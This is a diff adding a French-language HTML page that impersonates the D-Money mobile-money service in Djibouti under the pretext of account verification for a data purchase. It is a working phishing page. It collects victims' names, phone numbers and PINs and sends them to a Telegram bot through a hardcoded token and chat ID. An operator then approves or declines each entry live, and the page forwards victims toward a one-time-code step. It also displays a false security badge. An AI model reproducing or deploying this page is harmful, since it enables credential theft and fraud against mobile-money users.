@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#1b1464">
+    <title>D-Money | Vérifier Compte · Djibouti</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --navy: #1b1464;
+            --navy-dark: #0f0d3a;
+            --navy-light: #2d2680;
+            --gold: #f5a623;
+            --gold-light: #ffc857;
+            --orange: #e8841a;
+            --white: #ffffff;
+            --light: #f5f3f0;
+            --dark: #1a1a1a;
+            --muted: #666666;
+            --border: #e0ddd9;
+            --error: #d32f2f;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { -webkit-text-size-adjust: 100%; }
+
+        body {
+            font-family: 'Poppins', system-ui, sans-serif;
+            background: linear-gradient(135deg, var(--navy-dark) 0%, var(--navy) 50%, var(--navy-light) 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            background: white;
+            padding: 14px 5%;
+            border-bottom: 4px solid var(--gold);
+            box-shadow: 0 2px 8px rgba(27,20,100,0.08);
+        }
+
+        .logo { font-size: 22px; font-weight: 900; text-decoration: none; }
+        .logo .d { color: var(--navy); }
+        .logo .money { color: var(--gold); }
+
+        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 16px; }
+
+        .card {
+            background: white;
+            border-radius: 18px;
+            padding: 36px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(27,20,100,0.35);
+        }
+
+        .card-head { text-align: center; margin-bottom: 22px; }
+        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--navy); margin-bottom: 4px; }
+        .card-head p { color: var(--muted); font-size: 12px; }
+
+        .bundle-bar {
+            background: linear-gradient(135deg, var(--navy), var(--navy-dark));
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 20px;
+            color: white;
+            border: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
+        .b-row:last-child { margin-bottom: 0; padding-top: 8px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
+
+        .fg { margin-bottom: 16px; }
+        .fl { display: block; font-size: 10px; font-weight: 800; color: var(--navy); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 6px; }
+
+        .iw {
+            display: flex;
+            align-items: center;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            padding: 12px 14px;
+            background: var(--light);
+            transition: all 0.2s;
+        }
+
+        .iw:focus-within { border-color: var(--gold); background: white; box-shadow: 0 0 0 4px rgba(245,166,35,0.08); }
+
+        .prefix { font-weight: 800; color: var(--navy); margin-right: 8px; font-size: 13px; }
+
+        .fi {
+            flex: 1;
+            border: none;
+            background: transparent;
+            font-size: 14px;
+            color: var(--dark);
+            outline: none;
+            font-family: inherit;
+        }
+
+        .fi::placeholder { color: #b8b8b8; }
+
+        .pin-tog { background: none; border: none; color: var(--gold); cursor: pointer; font-weight: 800; font-size: 10px; font-family: inherit; transition: color 0.2s; }
+        .pin-tog:hover { color: var(--orange); }
+
+        .hint { font-size: 10px; color: var(--muted); margin-top: 4px; }
+
+        .err {
+            display: none;
+            background: rgba(211,47,47,0.08);
+            border: 1.5px solid rgba(211,47,47,0.2);
+            color: var(--error);
+            font-size: 12px;
+            font-weight: 700;
+            border-radius: 10px;
+            padding: 10px 12px;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+
+        .err.show { display: block; }
+
+        .btns { display: flex; gap: 10px; margin-top: 20px; }
+
+        .btn-p {
+            flex: 1;
+            background: linear-gradient(135deg, var(--navy), var(--navy-light));
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 50px;
+            font-weight: 900;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            cursor: pointer;
+            font-family: inherit;
+            box-shadow: 0 4px 14px rgba(27,20,100,0.28);
+            transition: all 0.2s;
+        }
+
+        .btn-p:hover { background: var(--gold); color: var(--navy); transform: translateY(-2px); box-shadow: 0 6px 18px rgba(245,166,35,0.3); }
+
+        .btn-o {
+            flex: 1;
+            background: transparent;
+            color: var(--navy);
+            border: 2px solid var(--navy);
+            padding: 14px;
+            border-radius: 50px;
+            font-weight: 800;
+            font-size: 12px;
+            text-transform: uppercase;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .btn-o:hover { background: var(--light); }
+
+        .card-ft { text-align: center; margin-top: 16px; font-size: 10px; color: var(--muted); }
+        .card-ft a { color: var(--gold); text-decoration: none; font-weight: 800; }
+        .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 12px; font-size: 10px; color: var(--muted); font-weight: 700; }
+
+        /* Loading */
+        .overlay {
+            position: fixed; inset: 0;
+            display: none;
+            align-items: center; justify-content: center; flex-direction: column; gap: 14px;
+            background: rgba(15,13,58,0.93);
+            z-index: 2000;
+            backdrop-filter: blur(6px);
+        }
+
+        .overlay.on { display: flex; }
+        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.12); border-top-color: var(--gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
+        .sp-t { font-size: 14px; font-weight: 800; color: white; }
+        .sp-s { font-size: 11px; color: rgba(255,255,255,0.65); }
+        @keyframes sp { to { transform: rotate(360deg); } }
+
+        /* Modal */
+        .modal {
+            position: fixed; inset: 0;
+            display: none;
+            align-items: center; justify-content: center;
+            background: rgba(15,13,58,0.75);
+            z-index: 2000; padding: 20px;
+            backdrop-filter: blur(6px);
+        }
+
+        .modal.on { display: flex; }
+
+        .modal-box {
+            background: white;
+            border-radius: 16px;
+            padding: 32px;
+            max-width: 360px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 16px 48px rgba(27,20,100,0.3);
+        }
+
+        .modal-box h2 { font-size: 18px; font-weight: 900; color: var(--navy); margin-bottom: 8px; }
+        .modal-box p { color: var(--muted); font-size: 13px; margin-bottom: 18px; }
+        .modal-btn { width: 100%; padding: 14px; border-radius: 50px; border: none; font-weight: 800; font-size: 12px; cursor: pointer; background: linear-gradient(135deg, var(--navy), var(--navy-light)); color: white; font-family: inherit; box-shadow: 0 4px 12px rgba(27,20,100,0.25); }
+
+        @media (max-width: 500px) {
+            main { padding: 24px 12px; }
+            .card { padding: 28px 18px; }
+            .btns { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+    <header><a class="logo" href="index.html"><span class="d">D-</span><span class="money">Money</span></a></header>
+
+    <main>
+        <div class="card">
+            <div class="card-head">
+                <h1>Vérifier Votre Compte</h1>
+                <p>Entrez vos détails D-Money pour acheter du data</p>
+            </div>
+
+            <div id="bBar" class="bundle-bar" style="display:none;">
+                <div class="b-row"><span>Forfait:</span><span id="bD">&mdash;</span></div>
+                <div class="b-row"><span>Montant:</span><span id="bP">0 DJF</span></div>
+            </div>
+
+            <div id="err" class="err"></div>
+
+            <form id="frm" onsubmit="doSubmit(event)">
+                <div class="fg">
+                    <label class="fl" for="name">Nom Complet</label>
+                    <div class="iw"><input type="text" class="fi" id="name" placeholder="Ahmed Hassan" autocomplete="name"></div>
+                </div>
+                <div class="fg">
+                    <label class="fl" for="phone">Numéro D-Money</label>
+                    <div class="iw"><span class="prefix">+253</span><input type="tel" class="fi" id="phone" placeholder="77 XX XX XX" inputmode="numeric" maxlength="8"></div>
+                    <p class="hint">8 chiffres (ex: 77XXXXXX)</p>
+                </div>
+                <div class="fg">
+                    <label class="fl" for="pin">Code PIN D-Money</label>
+                    <div class="iw"><input type="password" class="fi" id="pin" placeholder="&#8226;&#8226;&#8226;&#8226;" inputmode="numeric" maxlength="4"><button type="button" class="pin-tog" onclick="togPin()">Afficher</button></div>
+                    <p class="hint">4 chiffres PIN D-Money</p>
+                </div>
+                <div class="btns">
+                    <button type="submit" class="btn-p">Vérifier & Continuer</button>
+                    <button type="button" class="btn-o" onclick="location.href='index.html'">Annuler</button>
+                </div>
+            </form>
+
+            <div class="card-ft">En continuant vous acceptez nos <a href="#">Conditions</a> & <a href="#">Confidentialité</a></div>
+            <div class="secure">🔒 Chiffré 256-bit · PCI DSS</div>
+        </div>
+    </main>
+
+    <div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">Vérification du Compte</div><div class="sp-s">Veuillez patienter...</div></div>
+
+    <div id="aModal" class="modal">
+        <div class="modal-box">
+            <h2>Déjà Appliqué</h2>
+            <p>Cette transaction a déjà été appliquée à votre compte.</p>
+            <button class="modal-btn" onclick="goOTP()">Continuer</button>
+        </div>
+    </div>
+
+    <script>
+        const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
+        const CID = '7547427914';
+        let bd = {}, luid = 0;
+
+        function init() {
+            const p = new URLSearchParams(location.search);
+            const d = p.get('data'), pr = p.get('price');
+            if (d && pr) {
+                bd = { data: d, price: pr };
+                document.getElementById('bBar').style.display = 'block';
+                document.getElementById('bD').textContent = d;
+                document.getElementById('bP').textContent = pr + ' DJF';
+            }
+        }
+
+        function togPin() {
+            const el = document.getElementById('pin');
+            const b = event.target;
+            el.type = el.type === 'password' ? 'text' : 'password';
+            b.textContent = el.type === 'password' ? 'Afficher' : 'Masquer';
+        }
+
+        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
+        function clrErr() { document.getElementById('err').classList.remove('show'); }
+
+        async function tg(msg, btns) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
+                });
+            } catch(e) { console.error(e); }
+        }
+
+        function doSubmit(e) {
+            e.preventDefault();
+            clrErr();
+            const name = document.getElementById('name').value.trim();
+            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
+            const pin = document.getElementById('pin').value.trim();
+
+            if (!name) { showErr('Entrez votre nom complet'); return; }
+            if (phone.length < 8) { showErr('Entrez un numéro valide à 8 chiffres'); return; }
+            if (pin.length !== 4) { showErr('Le PIN doit être 4 chiffres'); return; }
+
+            const msg = `📱 <b>Nouvelle Connexion</b>\n\n<b>Nom:</b> <code>${name}</code>\n<b>Téléphone:</b> <code>+253${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Forfait:</b> <code>${bd.data || 'N/A'}</code>\n<b>Montant:</b> <code>${bd.price || '0'} DJF</code>`;
+
+            const btns = [
+                [{ text: '✓ Approuvé', callback_data: 'login_approved' }, { text: '✗ Refusé', callback_data: 'login_declined' }],
+                [{ text: '⚠️ Déjà Appliqué', callback_data: 'login_applied' }]
+            ];
+
+            document.getElementById('ov').classList.add('on');
+            tg(msg, btns);
+            poll();
+        }
+
+        function poll() {
+            const iv = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.ok && d.result.length > 0) {
+                            const u = d.result[0];
+                            luid = u.update_id;
+                            if (u.callback_query) {
+                                const cb = u.callback_query.data;
+                                if (cb === 'login_approved') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); goOTP(); }
+                                else if (cb === 'login_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Demande refusée. Réessayez.'); document.getElementById('frm').reset(); }
+                                else if (cb === 'login_applied') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('aModal').classList.add('on'); }
+                            }
+                        }
+                    }).catch(e => console.error(e));
+            }, 1000);
+            setTimeout(() => clearInterval(iv), 300000);
+        }
+
+        function goOTP() {
+            document.getElementById('aModal').classList.remove('on');
+            const ph = document.getElementById('phone').value.trim().replace(/\s/g, '');
+            location.href = `otp.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || ''}&phone=${ph}`;
+        }
+
+        document.getElementById('name').addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('phone').focus(); } });
+        document.getElementById('phone').addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('pin').focus(); } });
+
+        window.addEventListener('load', init);
+    </script>
+</body>
+</html>
